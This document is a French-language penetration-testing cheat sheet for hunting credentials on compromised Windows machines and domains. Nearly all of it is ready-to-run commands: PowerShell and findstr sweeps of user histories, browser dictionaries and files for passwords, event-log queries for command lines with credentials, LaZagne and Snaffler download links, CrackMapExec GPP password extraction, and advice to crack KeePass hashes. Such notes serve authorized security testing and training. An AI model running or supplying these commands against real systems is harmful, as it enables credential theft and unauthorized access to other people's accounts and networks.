---
public: true
---
## Dossiers intéressants
- `c:\`
- `%USERPROFILE%\`
- `%USERPROFILE%\Documents`
- `%USERPROFILE%\Desktop`

# Historiques Powershell

On peut vérifier l'emplacement de l'historique via : `(Get-PSReadLineOption).HistorySavePath`

Collecte des historiques (emplacement par défaut)

```powershell
Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## Dictionnaire Google Chrome

```powershell-session
Gci c:\Users -Directory | Select -ExpandProperty Name | %{ gc "C:\Users\$_\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password -ErrorAction SilentlyContinue}

```

## Recherche de unattend.xml

Script a définir (voir emplacements)

## Barre de recherche Windows

Mots à tenter dans la barre de recherche du menu Démarrer

```
Passwords
Passphrases
Keys
Username
User account
Creds
Users
Passkeys
Passphrases
configuration
dbcredential
dbpassword
pwd
Login
Credentials
```

## Findstr

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Noms de fichiers intéressants

```batch
dir c:\*cred* /s /b 
dir c:\*secret* /s /b
```

```powershell
Get-ChildItem -Recurse -Path C:\ -Include *cred* -File
```

## Contenus de fichiers intéressants

```
findstr /s /i cred c:\*.*
```

```powershell
Get-ChildItem -Recurse -Path C:\ | Select-String "cred" -List
```

```
REM 
dir n:\*cred* /s /b 
dir n:\*secret* /s /b

REM Recherche de mot intéressants dans des fichiers
findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt
```

## Observateur d'évènement

Si on est membre du groupe `Event Log Readers`, on pourra consulter l'observateur d'évènements.

Si les Event ID 4688 (Un nouveau processus a été créé) sont audités, on pourra potentiellement trouver lignes de commandes incluant des nom de compte utilisateur (voir des mots de passe).

```shell
###### nécessite d'être membre du gruope "Event Log Readers"
# Affiche toutes les lignes de commande auditées
wevtutil qe Security /rd:true /f:text | Select-String "line"
# Affiche les lignes contenant '/user'
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# avec credentials alternatifs
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

Version Powershell (**Nécessite d'être Administrateur local**)

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## Snaffler

<https://github.com/SnaffCon/Snaffler/releases/download/1.0.132/Snaffler.exe>

## Lazagne

<https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe>

```
C:\Users\bob\Desktop> start lazagne.exe all
```

## Mots de passe dans les stratégies de groupe

```
# cme smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password

Local admin:
# cme smb 10.0.5.1 -u Administrator -p P@ss123 -d . -M gpp_password
# cme smb 10.0.5.1 -u Administrator -p P@ss123 --local-auth -M gpp_password

Domain user:
# cme smb 10.0.5.1 -u bkpadmin -p P@ss123 -d target.corp -M gpp_password
```

## Autre

Passwords in scripts in different shares :

- SYSVOL
- IT shares

Passwords in web.config files on dev machines and IT shares

unattend.xml

Passwords in the AD user or computer description fields

KeePass databases --> pull hash, crack and get loads of access.

Found on user systems and shares

Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint
